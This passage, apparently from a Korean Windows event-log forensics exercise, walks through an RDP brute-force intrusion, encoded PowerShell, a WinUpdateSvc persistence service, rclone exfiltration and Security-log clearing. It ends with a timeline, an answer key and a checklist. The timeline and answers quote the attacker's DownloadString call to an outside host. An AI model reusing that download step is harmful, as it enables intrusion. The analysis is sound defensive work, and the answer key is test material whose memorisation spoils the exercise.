   => (3) URL = http://203.0.113.77/a.ps1

5. 세 번째 시도 (실패) — 같은 초 정렬로 인과가 뒤집혔다
   지속성 서비스 설치와 파일 생성의 순서를 서술하려 했다.

   Sort-Object TimeCreated 로 정렬한 결과:
     07:28:33Z  7045  WinUpdateSvc 설치
     07:28:33Z  4688  C:\Users\Public\svc.exe
   같은 초다. 정렬 결과가 실행할 때마다 달라졌고,
   한 번은 "서비스가 먼저 설치되고 그 다음에 파일이 실행됐다" 로 나왔다.
   이 서술은 논리적으로 이상하다 — 서비스 설치는 파일이 있어야 가능하다.

   무엇이 틀렸나:
     두 이벤트는 채널이 다르다(System vs Security).
     같은 초의 순서는 시각으로 정할 수 없고,
     채널이 다르면 EventRecordId 로도 비교할 수 없다.

   해결 (두 단계):
     (a) 같은 채널 안의 순서는 EventRecordId 로 확정
         Security 채널: 1184701 4688(svc.exe 실행) < 1184703 4672
     (b) 채널 간 순서는 인과와 더 정밀한 시각으로 확정
         원본 XML 의 SystemTime 소수부:
           Security 4688  07:28:33.1120044Z  (svc.exe 실행)
           System   7045  07:28:33.8810221Z  (서비스 설치)
         -> 실행이 먼저, 설치가 나중. 인과와도 맞는다.

   => (4) 서비스 이름 = WinUpdateSvc
      확증: ImagePath = C:\Users\Public\svc.exe (사용자 쓰기 가능 경로),
            그 파일은 07:27:51Z 에 생성 (Sysmon 없음 -> $MFT Created0x10 으로 확인),
            설치 세션이 0x1a2b3c

6. 네 번째 시도 (실패) — 로그 삭제 구간을 gap 으로 찾으려 했다
   Security 채널의 번호 누락을 계산했다.
     FirstId 1102841  LastId 1185204  Count 82364  Missing 0

   "누락이 0 이니 로그를 지우지 않았다" 로 결론? 오답.

   무엇이 틀렸나:
     로그 삭제는 중간 gap 을 만들지 않는다.
     파일이 새로 만들어지고 번호가 1 부터 다시 시작하거나,
     지금처럼 삭제 직전까지의 파일만 남아 1102 가 마지막 레코드가 된다.

   해결:
     1102 : 07:45:11Z, EventRecordId 1185204 = LastId
     -> Security 는 07:45:11Z 에서 끊겼다.

     다른 채널의 마지막 시각:
       System                        08:29:41Z
       PowerShell/Operational        08:12:07Z
       TS-LocalSessionManager        07:58:20Z
     -> 시스템은 08:29 까지 살아 있었다. Security 만 지운 것이다.

   => (5) 소실 구간 = 07:45:11Z ~ 08:29:41Z (약 44분 30초)
          = 16:45:11 ~ 17:29:41 KST

     그 구간을 메우기:
       $MFT / $J 에서 07:45~08:29 구간의 파일 활동 -> out.7z 삭제 기록
       PowerShell/Operational 4104 -> 08:05Z 에 rclone 실행 스크립트
       System 7036/7040 -> WinUpdateSvc 상태 변경
     로그가 없는 구간을 디스크와 다른 채널이 대신 증언한다.

7. 최종 타임라인 (KST, UTC 병기)

   | KST                 | UTC        | 채널      | ID   | 내용                                   | RecId   |
   | 2026-03-14 16:11:02 | 07:11:02Z  | Security  | 4625 | 203.0.113.77 무차별 대입 시작 (214건)  | 1184188 |
   | 2026-03-14 16:18:39 | 07:18:39Z  | Security  | 4625 | 마지막 실패                            | 1184402 |
   | 2026-03-14 16:19:01 | 07:19:01Z  | TS-RCM    | 1149 | RDP 인증 성공 Param3=203.0.113.77      | 44      |
   | 2026-03-14 16:19:02 | 07:19:02Z  | Security  | 4624 | svc_backup Type 10, LogonId 0x1a2b3c   | 1184571 |
   | 2026-03-14 16:19:02 | 07:19:02Z  | Security  | 4672 | 특수 권한 부여 (관리자 세션)           | 1184572 |
   | 2026-03-14 16:19:03 | 07:19:03Z  | TS-LSM    | 21   | SessionID=3, Address=203.0.113.77      | 118     |
   | 2026-03-14 16:20:08 | 07:20:08Z  | Security  | 4688 | powershell.exe (CommandLine 미기록)    | 1184574 |
   | 2026-03-14 16:20:08 | 07:20:08Z  | PowerShell| 4103 | Host Application = powershell -enc ... | 902     |
   | 2026-03-14 16:20:09 | 07:20:09Z  | PowerShell| 4104 | 5조각 재조립: DownloadString(http://203.0.113.77/a.ps1) | 903-907 |
   | 2026-03-14 16:27:51 | 07:27:51Z  | ($MFT)    | —    | C:\Users\Public\svc.exe 생성           | —       |
   | 2026-03-14 16:28:33 | 07:28:33Z  | Security  | 4688 | svc.exe 실행                           | 1184701 |
   | 2026-03-14 16:28:33 | 07:28:33Z  | System    | 7045 | WinUpdateSvc 설치 (지속성)             | 8842    |
   | 2026-03-14 16:31:44 | 07:31:44Z  | Security  | 5145 | C$ Users\Public\out.7z 접근            | 1184880 |
   | 2026-03-14 17:05:12 | 08:05:12Z  | PowerShell| 4104 | rclone 실행 스크립트 (반출)            | 1044    |
   | 2026-03-14 16:45:11 | 07:45:11Z  | Security  | 1102 | 감사 로그 삭제 (Security 마지막 레코드)| 1185204 |
   | 2026-03-14 17:29:41 | 08:29:41Z  | System    | —    | System 채널의 마지막 이벤트            | 12844   |

   정답:
    (1) 2026-03-14 16:11:02 KST
    (2) svc_backup
    (3) http://203.0.113.77/a.ps1
    (4) WinUpdateSvc
    (5) 2026-03-14 16:45:11 ~ 17:29:41 KST 의 Security 채널 (약 44분 30초)
```

네 번의 교정이 이 풀이의 전부다. **① `CommandLine` 이 비어 있는 것은 "기록 안 됨"이다** — 4103 `ContextInfo` 로 우회한다. **② 4104는 조각으로 쪼개진다** — `ScriptBlockId` 로 재조립하지 않으면 Base64가 절대 안 풀린다. **③ 같은 초의 순서는 시각으로 못 정하고, 채널이 다르면 번호로도 못 정한다** — 같은 채널은 `EventRecordId`, 채널 간은 `SystemTime` 소수부와 인과. **④ 로그 삭제는 gap이 아니라 "번호 재시작" 또는 "1102가 마지막 레코드"로 나타난다** — 소실 구간은 다른 채널의 마지막 시각과의 대비로 계산한다.

## 막혔을 때 다음 체크

1. 5개 채널을 모두 뽑았는가 (`-d` 로 폴더 전체)
2. 노이즈 제거로 행이 10분의 1 이하로 줄었는가
3. 4625를 IP별로 집계해 시작·종료 시각을 확정했는가
4. `SubStatus` 로 공격 성격(계정 열거 vs 비밀번호 대입)을 판정했는가
5. 4624 Type 10 / 1149 `Param3` / 21의 주소가 **모두** 일치하는가
6. `TargetLinkedLogonId` 로 분리 토큰 짝을 찾았는가
7. `CommandLine` 이 비어 있으면 4103 `ContextInfo` 로 우회했는가
8. 4104 조각 수가 `MessageTotal` 과 같은가
9. `-enc` 를 UTF-16LE로 디코딩했는가
10. 7045의 `ImagePath` 경로와 그 파일의 생성 시각을 확인했는가
11. 1102가 Security의 마지막 레코드인가
12. 다른 채널의 마지막 시각과 대비해 소실 구간을 계산했는가
13. 같은 초 순서를 채널 안에서 `EventRecordId` 로 정렬했는가
14. 채널 간 순서를 `SystemTime` 소수부와 인과로 정했는가
15. `Get-WinEvent` 결과를 `ToUniversalTime()` 으로 맞췄는가
16. 최종 표에 KST와 UTC를 함께 넣고 `RecordId` 근거를 붙였는가

## 출처

- SRC-022 — Microsoft Learn, 고급 보안 감사 정책 설정: 4624·4625(`Status`/`SubStatus`)·4672·4688·5145·1102 의 정의와 EventData 필드, 명령행 기록이 별도 정책이라는 근거
- SRC-023 — Microsoft Learn, about_Logging_Windows / PowerShell 로깅: 4104(스크립트 블록 로깅)의 `ScriptBlockText`·`ScriptBlockId`·`MessageNumber`·`MessageTotal`·`Path`, 4103(모듈/파이프라인 로깅)의 `ContextInfo`, 스크립트 블록이 여러 이벤트로 분할 기록된다는 근거
- SRC-025 — Microsoft Learn, Remote Desktop Services 이벤트: RemoteConnectionManager 1149와 LocalSessionManager 21/24/25가 `UserData` 구조로 기록되며 원본 주소와 세션 번호를 담는다는 근거
- SRC-004 — Eric Zimmerman 문서: EvtxECmd의 `-f`/`-d`/`--csv`/`--csvf` 옵션과 CSV 컬럼(`Channel`, `EventRecordId`, `Payload`, `MapDescription`), Timeline Explorer 사용
- 4625의 `SubStatus` 코드 값(`0xC0000064`, `0xC000006A`, `0xC0000072`, `0xC0000234` 등)은 Microsoft의 4625 문서 기준이다. 이 글에서 인용한 값 외의 코드는 그 문서에서 확인할 것
- 1149와 21/24/25의 개별 필드 이름(`Param1`~`Param3`, `User`, `SessionID`, 주소 필드)은 Windows 버전에 따라 표기가 다를 수 있으므로 `UserData.InnerXml` 을 실제로 출력해 확인할 것
- 4103 `ContextInfo` 의 항목 이름(`Host Application` 등)은 시스템 로케일에 따라 번역될 수 있으므로 실제 값을 한 번 출력해 정규식을 맞출 것
- 7045(Service Control Manager)의 필드 이름과 7036/7040(서비스 상태 변경)의 정식 정의는 실제 이벤트 XML과 Microsoft 문서에서 확인할 것
